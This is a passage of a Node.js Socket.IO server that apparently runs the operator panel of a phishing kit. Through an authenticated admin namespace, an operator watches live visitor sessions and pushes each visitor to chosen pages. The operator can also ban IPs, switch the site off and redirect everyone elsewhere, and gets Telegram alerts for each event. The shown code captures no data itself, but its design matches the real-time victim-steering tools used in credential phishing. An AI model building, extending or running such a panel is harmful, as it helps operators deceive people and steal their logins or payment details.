            if (session && session.url) {
                socket.emit('session_url', session.url);
            }
        });

        socket.on('page_loading', (isLoading) => {
            const session = sessionManager.getSession(sessionId);
            if (session) {
                session.loading = isLoading;
                session.lastAccessed = Date.now();
                session.lastHeartbeat = Date.now();
                
                // If page load completes, clear any pending disconnect timeout
                if (!isLoading) {
                    const existingTimeout = loadingTimeouts.get(sessionId);
                    if (existingTimeout) {
                        clearTimeout(existingTimeout);
                        loadingTimeouts.delete(sessionId);
                    }
                    session.connected = true; // Ensure we mark as connected when load completes
                }
                
                if (!sessionManager.isPending(sessionId)) {
                    adminNamespace.emit('session_updated', session);
                }
            }
        });
    

        // Handle disconnection with cleanup delay
        socket.on('disconnect', () => {
            const sessionId = socket.sessionId;
            const session = sessionManager.getSession(sessionId);
            
            if (session) {
                // If we're loading, give a grace period before marking as disconnected
                if (session.loading) {
                    // Clear any existing timeout
                    const existingTimeout = loadingTimeouts.get(sessionId);
                    if (existingTimeout) {
                        clearTimeout(existingTimeout);
                    }
        
                    // Set new timeout - only mark as disconnected if load doesn't complete in 5s
                    const timeout = setTimeout(() => {
                        const currentSession = sessionManager.getSession(sessionId);
                        if (currentSession && currentSession.loading) {
                            currentSession.loading = false;
                            currentSession.connected = false;
                            adminNamespace.emit('session_updated', currentSession);
                        }
                        loadingTimeouts.delete(sessionId);
                    }, 5000);
                    
                    loadingTimeouts.set(sessionId, timeout);
                } else {
                    // If not loading, mark as disconnected immediately
                    session.connected = false;
                    session.loading = false;
                    adminNamespace.emit('session_updated', session);
                }
        
                session.lastHeartbeat = Date.now();
                
                setTimeout(() => {
                    const currentSession = sessionManager.getSession(sessionId);
                    if (currentSession && !currentSession.connected && 
                        Date.now() - currentSession.lastHeartbeat > 900000) {
                        
                        // Clear any remaining timeouts for this session
                        const existingTimeout = loadingTimeouts.get(sessionId);
                        if (existingTimeout) {
                            clearTimeout(existingTimeout);
                            loadingTimeouts.delete(sessionId);
                        }
                        
                        sessionManager.deleteSession(sessionId);
                        
                        if (!sessionManager.isPending(sessionId)) {
                            adminNamespace.emit('session_removed', sessionId);
                        }
                    }
                }, 900000);
            }
        });

    } catch (error) {
        console.error('Connection handling error:', error);
        socket.disconnect(true);
    }
});



// Admin namespace
const adminNamespace = io.of('/admin');

adminNamespace.use((socket, next) => {
    const token = socket.handshake.auth.token;
    if (verifyAdmin(token)) {
        next();
    } else {
        next(new Error('Authentication failed'));
    }
});

adminNamespace.on('connection', (socket) => {
    // Only get verified sessions using the session manager's method
    const verifiedSessions = sessionManager.getAllVerifiedSessions();
    
    socket.emit('init', {
        settings: state.settings,
        sessions: verifiedSessions,
        bannedIPs: ipManager.getAllBannedIPs(),
        availablePages: state.settings.availablePages
    });

    socket.on('update_settings', (newSettings) => {
        const oldSettings = { ...state.settings };
        Object.assign(state.settings, newSettings);
        adminNamespace.emit('settings_updated', state.settings);
        
        // If website is being disabled
        if (oldSettings.websiteEnabled && !newSettings.websiteEnabled) {
            // Get all verified sessions
            const allSessions = sessionManager.getAllVerifiedSessions();
            
            // Disconnect and redirect all active sessions
            for (const session of allSessions) {
                const sockets = Array.from(userNamespace.sockets.values());
                const targetSocket = sockets.find(s => s.sessionId === session.id);
                if (targetSocket) {
                    // First redirect
                    targetSocket.emit('redirect', state.settings.redirectUrl);
                    // Then force disconnect
                    setTimeout(() => {
                        targetSocket.disconnect(true);
                    }, 500);
                }
                // Also clean up the session
                sessionManager.deleteSession(session.id);
            }
            
            // Clear all sessions since site is disabled
            sessionManager.sessions.clear();
            sessionManager.pendingSessions.clear();
            adminNamespace.emit('sessions_cleared');
        }
    
        // Send status update
        if (oldSettings.websiteEnabled !== newSettings.websiteEnabled) {
            sendStatusUpdate({
                websiteEnabled: newSettings.websiteEnabled,
                activeSessions: sessionManager.sessions.size,
                bannedIPs: state.bannedIPs.size
            });
        }
    });

    socket.on('redirect_user', ({ sessionId, page }) => {
        const sockets = Array.from(userNamespace.sockets.values());
        const targetSocket = sockets.find(s => s.sessionId === sessionId);
        
        if (targetSocket) {
            const session = sessionManager.getSession(sessionId);
            if (session) {
                // Clear any existing timeout
                const existingTimeout = loadingTimeouts.get(sessionId);
                if (existingTimeout) {
                    clearTimeout(existingTimeout);
                }
                
                session.loading = true;
                session.connected = true;
                session.lastHeartbeat = Date.now();
                adminNamespace.emit('session_updated', session);
                
                // Set new loading timeout
                const timeout = setTimeout(() => {
                    const currentSession = sessionManager.getSession(sessionId);
                    if (currentSession && currentSession.loading) {
                        currentSession.loading = false;
                        currentSession.connected = false;
                        adminNamespace.emit('session_updated', currentSession);
                    }
                    loadingTimeouts.delete(sessionId);
                }, 5000);
                
                loadingTimeouts.set(sessionId, timeout);
                
                const pageName = page.replace('.html', '');
                const pageNameCapitalized = pageName.charAt(0).toUpperCase() + pageName.slice(1).toLowerCase();
                
                session.currentPage = pageNameCapitalized;
                const newUrl = sessionManager.updateSessionUrl(session);
                
                if (newUrl) {
                    targetSocket.emit('redirect', newUrl);
                }
            }
        }
    });
    



    
    socket.on('remove_session', async ({ sessionId }) => {
        const session = sessionManager.getSession(sessionId);
        if (session) {
          // Emit redirect to the user socket
          const sockets = Array.from(userNamespace.sockets.values());
          const targetSocket = sockets.find(s => s.sessionId === sessionId);
          if (targetSocket) {
            targetSocket.emit('redirect', state.settings.redirectUrl);
            targetSocket.disconnect(true);
          }
          
          // Delete the session
          sessionManager.deleteSession(sessionId);
          adminNamespace.emit('session_removed', sessionId);
          await sendTelegramNotification(formatTelegramMessage('session_removed', {
            id: sessionId,
            removedBy: 'admin'
          }));
        }
      });
    socket.on('ban_ip', async (ip) => {
        try {
            const publicIP = await getPublicIP(ip);
            
            ipManager.banIP(publicIP, {
                bannedBy: socket.id,
                bannedAt: new Date().toISOString()
            });
            
            state.bannedIPs = new Set(ipManager.getAllBannedIPs());

            // Disconnect all sessions from this IP
            for (const session of sessionManager.sessions.values()) {
                if (session.clientIP === publicIP) {
                    const sockets = Array.from(userNamespace.sockets.values());
                    const targetSocket = sockets.find(s => s.sessionId === session.id);
                    if (targetSocket) {
                        targetSocket.emit('redirect', state.settings.redirectUrl);
                        targetSocket.disconnect(true);
                    }
                    sessionManager.deleteSession(session.id);
                }
            }
            
            adminNamespace.emit('ip_banned', publicIP);
            await sendTelegramNotification(formatTelegramMessage('ip_banned', {
                ip: publicIP,
                bannedBy: socket.id
            }));
        } catch (error) {
            console.error('Error banning IP:', error);
            ipManager.banIP(ip);
            adminNamespace.emit('ip_banned', ip);
        }
    });

    socket.on('unban_ip', async (ip) => {
        try {
            const publicIP = await getPublicIP(ip);
            ipManager.unbanIP(publicIP);
            state.bannedIPs = new Set(ipManager.getAllBannedIPs());
            adminNamespace.emit('ip_unbanned', publicIP);
            await sendTelegramNotification(formatTelegramMessage('ip_unbanned', {
                ip: publicIP
            }));
        } catch (error) {
            console.error('Error unbanning IP:', error);
            ipManager.unbanIP(ip);
            adminNamespace.emit('ip_unbanned', ip);
        }
    });

    socket.on('clear_sessions', async () => {
        try {
            const sockets = Array.from(userNamespace.sockets.values());
            for (const userSocket of sockets) {
                userSocket.emit('redirect', state.settings.redirectUrl);
                userSocket.disconnect(true);
            }
            
            for (const sessionId of sessionManager.sessions.keys()) {
                sessionManager.deleteSession(sessionId);
            }
            
            adminNamespace.emit('sessions_cleared');
            await sendTelegramNotification('🗑️ All sessions cleared by admin');
        } catch (error) {
            console.error('Error clearing sessions:', error);
            await sendTelegramNotification('❌ Error clearing sessions');
        }
    });
});

// Clean up sessions periodically
setInterval(() => {
    const now = Date.now();
    for (const [sessionId, session] of state.sessions) {
        // Check for heartbeat timeout (30 seconds)
        if (now - session.lastHeartbeat > 30000 && session.connected) {
            session.connected = false;
            adminNamespace.emit('session_updated', session);
        }

        // Delete after 30 minutes of no heartbeat
        if (now - session.lastHeartbeat > 30 * 60 * 1000) {
            state.sessions.delete(sessionId);
            sessionManager.deleteSession(sessionId);
            adminNamespace.emit('session_removed', sessionId);
        }
    }
}, 10000);

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, async () => {
    console.log(`Server running on port ${PORT}`);
    await sendTelegramNotification(formatTelegramMessage('server_status', {
        status: 'Online',
        port: PORT
    }));
});
